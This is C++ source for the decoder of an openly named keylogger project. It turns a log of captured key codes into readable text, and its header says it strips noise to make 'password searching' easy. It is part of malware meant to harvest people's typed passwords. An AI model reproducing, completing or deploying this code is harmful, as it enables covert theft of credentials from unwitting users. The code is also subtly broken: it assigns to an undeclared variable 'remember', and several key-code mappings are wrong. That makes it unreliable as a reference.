/**
* Developer: Minhas Kamal (minhaskamal024@gmail.com)
* Date: 15.Aug.2014
* License:  GNU General Public License version-3
* Website: https://github.com/MinhasKamal/KeyLogger
* Comment: A simple ASCII to character decoder, but 
*    efficient in removing apparently useless data.
*    Which makes 'password searching' easy!
**/

#include <stdio.h>
#include <time.h>
#include <iostream>

#define INPUT_FILE_NAME "Record.log"
#define OUTPUT_FILE_NAME "Data.log"

using namespace std;


char* decode(int i);
int repeat[]={0, 0, 0, 0};

int main(){
    FILE *file = fopen(INPUT_FILE_NAME, "a");
    fprintf(file, "0");
    fclose(file);

    FILE *inputFile, *outputFile;

    if((inputFile=fopen(INPUT_FILE_NAME, "r"))==NULL || (outputFile=fopen(OUTPUT_FILE_NAME, "a"))==NULL){
        printf("ERROR!!!");
        return 1;
    }

    int num;
    char date[30];
    char ch = fgetc(inputFile);
    while(ch!=EOF){

        if(ch=='\t'){
            fprintf(outputFile, ">>\n");

            fscanf(inputFile, "%d", &num);
            while(num!=0){
                fprintf(outputFile, "%s", decode(num));
                fscanf(inputFile, "%d", &num);
            }
        }else{
            fgets(date, 30, inputFile);
            fprintf(outputFile, "%c%s", ch, date);
        }

        ch = fgetc(inputFile);
    }

    fclose(inputFile);
    fclose(outputFile);

    return 0;
}


char* decode(int i){
    char* ch;
	
	repeat[0]=repeat[1];
	repeat[1]=repeat[2];
	repeat[2]=repeat[3];
	repeat[3]=i;
	if(repeat[0]==repeat[1] && repeat[1]==repeat[2] && repeat[2]==repeat[3]){
		ch="";
        return ch;
	}

    switch(i){
    //case 1:
      //  ch="[LC]";  //left mouse click
        //break;
    //case 2:
      //  ch="[RC]";  //right mouse click
        //break;
    //case 3:
      //  ch="\n";
        //break;
    case 4:
        ch="[4]";
        break;
    case 8:
        ch="[<B]";  //backspace
        break;
    case 9:
        ch="[TAB]";
        break;
    //case 10:
      //  ch="\n";
        //break;
    case 13:
        ch="\n";    //enter
        remember=i;
        break;
    case 16:
        ch="[SH]";  //shift
        break;
    //case 17:
      //  ch="[CTR]"; //control
        //break;
    //case 18:
      //  ch="[ALT]";
        //break;
    case 19:
        ch="[19]";
        break;
    case 20:
        ch="[CAP]"; //caps lock
        break;
    case 27:
        ch="[ESC]";
        break;
    case 32:
        ch=" ";
        break;
    case 33:
        ch="[PgU]"; //page up
        break;
    case 34:
        ch="[PgD]"; //page down
        break;
    case 35:
        ch="#";
        break;
    case 36:
        ch="$";
        break;
    //case 37:
      //  ch="[L]";   //left arrow key
        //break;
    //case 38:
      //  ch="[U]";   //up arrow key
        //break;
    //case 39:
      //  ch="[R]";   //right arrow key
        //break;
    //case 40:
      //  ch="[D]";   //down arrow key
        //break;
    case 41:
        ch=")";
        break;
    case 42:
        ch="*";
        break;
	case 43:
        ch="+";
        break;
	case 44:
        ch=",";
        break;
	case 45:
        ch="[INS]"; //insert button
        break;
	case 46:
        ch="[DEL]"; //delete button
        break;
	case 47:
        ch="/";
        break;
	case 48:
        ch="0";
        break;
	case 49:
        ch="1";
        break;
	case 50:
        ch="2";
        break;
	case 51:
        ch="3";
        break;
	case 52:
        ch="4";
        break;
	case 53:
        ch="5";
        break;
	case 54:
        ch="6";
        break;
	case 55:
        ch="7";
        break;
	case 56:
        ch="8";
        break;
	case 57:
        ch="9";
        break;
	case 58:
        ch=":";
        break;
	case 59:
        ch=";";
        break;
	case 60:
        ch="<";
        break;
	case 61:
        ch="=";
        break;
	case 62:
        ch=">";
        break;
	case 63:
        ch="?";
        break;
	case 64:
        ch="@";
        break;
	case 65:
        ch="A";
        break;
	case 66:
        ch="B";
        break;
	case 67:
        ch="C";
        break;
	case 68:
        ch="D";
        break;
	case 69:
        ch="E";
        break;
	case 70:
        ch="F";
        break;
	case 71:
        ch="G";
        break;
	case 72:
        ch="H";
        break;
	case 73:
        ch="I";
        break;
	case 74:
        ch="J";
        break;
	case 75:
        ch="K";
        break;
	case 76:
        ch="L";
        break;
	case 77:
        ch="M";
        break;
	case 78:
        ch="N";
        break;
	case 79:
        ch="O";
        break;
	case 80:
        ch="P";
        break;
	case 81:
        ch="Q";
        break;
	case 82:
        ch="R";
        break;
	case 83:
        ch="S";
        break;
	case 84:
        ch="T";
        break;
	case 85:
        ch="U";
        break;
	case 86:
        ch="V";
        break;
	case 87:
        ch="W";
        break;
	case 88:
        ch="X";
        break;
	case 89:
        ch="Y";
        break;
	case 90:
        ch="Z";
        break;
	case 91:
        ch="[STA]"; //start button
        break;
	case 92:
        ch="\\";
        break;
	case 93:
        ch="[MEN]"; //menu button
        break;
	case 94:
        ch="^";
        break;
	case 95:
        ch="_";
        break;
	case 96:
        ch="`";
        break;
	case 97:
        ch="a";
        break;
	case 98:
        ch="b";
        break;
	case 99:
        ch="c";
        break;
	case 100:
        ch="d";
        break;
	case 101:
        ch="e";
        break;
	case 102:
        ch="f";
        break;
	case 103:
        ch="g";
        break;
	case 104:
        ch="h";
        break;
	case 105:
        ch="i";
        break;
	case 106:
        ch="j";
        break;
	case 107:
        ch="k";
        break;
	case 108:
        ch="l";
        break;
	case 109:
        ch="m";
        break;
	case 110:
        ch="n";
        break;
	case 111:
        ch="o";
        break;
	case 112:
        ch="[F1]";
        break;
	case 113:
        ch="[F2]";
        break;
	case 114:
        ch="[F3]";
        break;
	case 115:
        ch="[F4]";
        break;
	case 116:
        ch="[F5]";
        break;
	case 117:
        ch="[F6]";
        break;
	case 118:
        ch="[F7]";
        break;
	case 119:
        ch="[F8]";
        break;
	case 120:
        ch="[F9]";
        break;
	case 121:
        ch="[F10]";
        break;
	case 122:
        ch="[F11]";
        break;
	case 123:
        ch="[F12]";
        break;
	case 124:
        ch="|";
        break;
	case 125:
        ch="}";
        break;
	case 126:
        ch="~";
        break;
	case 150:
        ch="-";
        break;
	case 186:
        ch=";";
        break;
    case 187:
        ch="=";
        break;
    case 188:
        ch=",";
        break;
    case 189:
        ch="-";
        break;
    case 190:
        ch=".";
        break;
    case 191:
        ch="/";
        break;
    case 192:
        ch="`";
        break;
	case 219:
        ch="[";
        break;
    case 220:
        ch="\\";
        break;
    case 221:
        ch="]";
        break;
    case 222:
        ch="'";
        break;
		
    default:
        //ch="[U?]";
        ch="";
    }

    return ch;
}
